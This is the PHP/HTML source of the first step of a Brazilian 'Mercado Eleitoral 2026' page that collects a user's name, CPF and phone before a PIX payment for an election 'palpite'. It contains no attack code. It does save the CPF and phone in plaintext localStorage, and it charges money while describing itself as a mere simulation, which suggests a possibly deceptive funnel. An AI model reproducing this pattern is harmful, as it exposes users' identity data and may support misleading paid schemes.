<?php
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}
require_once 'db_config.php';

$servico = isset($_GET['servico']) ? $_GET['servico'] : (isset($_SESSION['servico_escolhido']) ? $_SESSION['servico_escolhido'] : 'Palpite Eleitoral 2026');
$_SESSION['servico_escolhido'] = $servico;
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mercado Eleitoral 2026 - Validação do Palpite</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        .bg-custom-header { background-color: #0f172a; }
        .card-custom {
            background: linear-gradient(135deg, rgba(30, 41, 59, 0.85), rgba(15, 23, 42, 0.98));
            border: 1px solid rgba(56, 189, 248, 0.25);
            backdrop-filter: blur(12px);
        }
    </style>
</head>
<body class="bg-slate-950 min-h-screen font-sans text-gray-100 flex flex-col justify-between">

    <!-- Topo -->
    <header class="bg-custom-header text-white text-xs py-3 px-4 border-b border-slate-800">
        <div class="max-w-xl mx-auto flex justify-between items-center">
            <span class="font-semibold flex items-center gap-2">
                <i class="fa-solid fa-chart-line text-emerald-400"></i> Mercado Eleitoral 2026
            </span>
            <span class="text-emerald-400 font-bold flex items-center gap-1">
                <i class="fa-solid fa-shield-halved"></i> Ambiente Seguro
            </span>
        </div>
    </header>

    <!-- Sub-cabeçalho da Página -->
    <div class="bg-slate-900 border-b border-slate-800 py-3 px-4 text-center">
        <div class="max-w-xl mx-auto flex items-center justify-between">
            <div class="flex items-center gap-2 text-left">
                <div class="w-8 h-8 rounded-lg bg-blue-500/20 text-blue-400 flex items-center justify-center font-bold text-sm">
                    <i class="fa-solid fa-user-pen"></i>
                </div>
                <div>
                    <h2 class="text-xs font-bold text-white uppercase tracking-wider">Identificação do Participante</h2>
                    <p class="text-[10px] text-slate-400">Preencha seus dados para registrar o palpite</p>
                </div>
            </div>
            <span class="text-[10px] bg-blue-500/20 text-blue-400 font-bold px-2.5 py-1 rounded-full border border-blue-500/30">
                Passo 1 de 2
            </span>
        </div>
    </div>

    <!-- Conteúdo Principal -->
    <main class="max-w-xl w-full mx-auto p-4 my-4 space-y-4">

        <div class="card-custom rounded-2xl p-6 shadow-2xl space-y-5">

            <!-- Box do Serviço/Palpite Selecionado -->
            <div class="bg-slate-900/90 border border-blue-500/30 rounded-xl p-3.5 flex items-start gap-3">
                <div class="text-blue-400 mt-0.5">
                    <i class="fa-solid fa-circle-info text-sm"></i>
                </div>
                <div class="text-xs space-y-0.5">
                    <span class="text-slate-400 font-semibold block">Palpite Selecionado:</span>
                    <span class="font-bold text-white"><?php echo htmlspecialchars($servico); ?></span>
                </div>
            </div>

            <!-- Formulário apontando para o pay.php -->
            <form action="pay.php" method="POST" class="space-y-4" onsubmit="salvarDadosLocais()">

                <!-- Campo oculto para passar o serviço/palpite adiante -->
                <input type="hidden" name="servico" value="<?php echo htmlspecialchars($servico); ?>">

                <!-- Nome Completo -->
                <div class="space-y-1.5">
                    <label class="block text-xs font-bold text-slate-300 uppercase tracking-wider">
                        Nome Completo (Conforme Documento)
                    </label>
                    <div class="relative">
                        <span class="absolute inset-y-0 left-0 pl-3.5 flex items-center text-slate-400 text-sm">
                            <i class="fa-solid fa-user text-xs"></i>
                        </span>
                        <input type="text" name="nome" id="nome" required placeholder="Digite seu nome completo" class="w-full bg-slate-900 border border-slate-700 rounded-xl pl-10 pr-4 py-3 text-sm text-white focus:outline-none focus:border-blue-500 font-medium">
                    </div>
                </div>

                <!-- CPF e Telefone -->
                <div class="grid grid-cols-1 md:grid-cols-2 gap-3">
                    <div class="space-y-1.5">
                        <label class="block text-xs font-bold text-slate-300 uppercase tracking-wider">CPF</label>
                        <div class="relative">
                            <span class="absolute inset-y-0 left-0 pl-3.5 flex items-center text-slate-400 text-sm">
                                <i class="fa-solid fa-id-card text-xs"></i>
                            </span>
                            <input type="text" name="cpf" id="cpf" required placeholder="000.000.000-00" maxlength="14" oninput="mascaraCPF(this)" class="w-full bg-slate-900 border border-slate-700 rounded-xl pl-10 pr-4 py-3 text-sm text-white focus:outline-none focus:border-blue-500 font-medium">
                        </div>
                    </div>
                    <div class="space-y-1.5">
                        <label class="block text-xs font-bold text-slate-300 uppercase tracking-wider">Telefone / WhatsApp</label>
                        <div class="relative">
                            <span class="absolute inset-y-0 left-0 pl-3.5 flex items-center text-slate-400 text-sm">
                                <i class="fa-solid fa-phone text-xs"></i>
                            </span>
                            <input type="text" name="telefone" id="telefone" required placeholder="(00) 00000-0000" maxlength="15" oninput="mascaraTelefone(this)" class="w-full bg-slate-900 border border-slate-700 rounded-xl pl-10 pr-4 py-3 text-sm text-white focus:outline-none focus:border-blue-500 font-medium">
                        </div>
                    </div>
                </div>

                <!-- Botão de Avançar para Pagamento -->
                <button type="submit" class="w-full bg-emerald-600 hover:bg-emerald-500 text-white font-bold py-3.5 px-4 rounded-xl transition shadow-lg shadow-emerald-600/30 flex items-center justify-center gap-2 text-sm mt-3">
                    <span>Avançar para Pagamento PIX</span>
                    <i class="fa-solid fa-arrow-right text-xs"></i>
                </button>
            </form>

        </div>

    </main>

    <!-- Rodapé -->
    <footer class="text-center text-[10px] text-slate-500 py-3">
        Plataforma interativa de simulação de cenários políticos e pesquisas eleitorais 2026.
    </footer>

    <script>
        function mascaraCPF(input) {
            let v = input.value.replace(/\D/g, "");
            if (v.length > 11) v = v.slice(0, 11);
            v = v.replace(/(\d{3})(\d)/, "$1.$2");
            v = v.replace(/(\d{3})(\d)/, "$1.$2");
            v = v.replace(/(\d{3})(\d{1,2})$/, "$1-$2");
            input.value = v;
        }

        function mascaraTelefone(input) {
            let v = input.value.replace(/\D/g, "");
            if (v.length > 11) v = v.slice(0, 11);
            if (v.length > 10) {
                v = v.replace(/^(\d{2})(\d{5})(\d{4}).*/, "($1) $2-$3");
            } else if (v.length > 5) {
                v = v.replace(/^(\d{2})(\d{4})(\d{0,4}).*/, "($1) $2-$3");
            } else if (v.length > 2) {
                v = v.replace(/^(\d{2})(\d{0,5})/, "($1) $2");
            } else {
                v = v.replace(/^(\d*)/, "($1");
            }
            input.value = v;
        }

        function salvarDadosLocais() {
            localStorage.setItem('nome_participante', document.getElementById('nome').value);
            localStorage.setItem('cpf_participante', document.getElementById('cpf').value);
            localStorage.setItem('telefone_participante', document.getElementById('telefone').value);
        }
    </script>
</body>
</html>